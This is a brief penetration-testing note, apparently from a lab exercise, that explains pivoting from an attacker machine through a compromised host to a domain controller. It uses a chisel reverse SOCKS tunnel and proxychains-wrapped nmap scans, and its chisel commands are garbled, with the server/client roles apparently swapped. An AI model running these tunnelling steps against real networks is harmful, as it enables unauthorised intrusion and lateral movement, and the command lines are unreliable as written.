Let's say we have our Host Machine and Victim Machine with the following addresses. The goal machine is the machine that we are trying to tunnel to.

Attacker Machine (Through VPN) - 10.0.30.67/24
Victim Machine - 10.0.30.7/24 (Also has another Ethernet adapter to 10.0.10.0/24)
Goal Machine - 10.0.10.89/24 - DOMAIN CONTROLLER

In some way, I was able to use our Attacking Machine to do some sort of exploit and obtain RCE privileges on the Victim Machine. I can essentially use the Victim Machine as a proxy to pivot to the Goal machine.

`https://github.com/jpillora/chisel.git`
> Go to "Releases"
> Install chisel_1.9.1_linux_386.gz (LINUX)
> Install chisel_1.9.1_windows_386.gz (WINDOWS)

* Transfer the chisel.exe file to the Victim Machine
	* Just do it over a simple python server or smth

`./chisel server -p -p 8000 reverse` > RUN ON VICTIM MACHINE
`./chisel client <VICTIM$IP>:8000 R:socks` > RUN ON ATTACKER MACHINE
> Looking to see "Connected" on the Attacking Machine
> As well as a session established on the Victim Machine

We can now use Proxychains and prepend that to ANY command that we want to run

`proxychains nmap -sT -p 88 -Pn -n 10.0.10.89` (Just as an example)
> If port 88 is open on this device, then that probably means that its the DC!

We should now be able to reach the domain controller by tunneling through the victim machine.
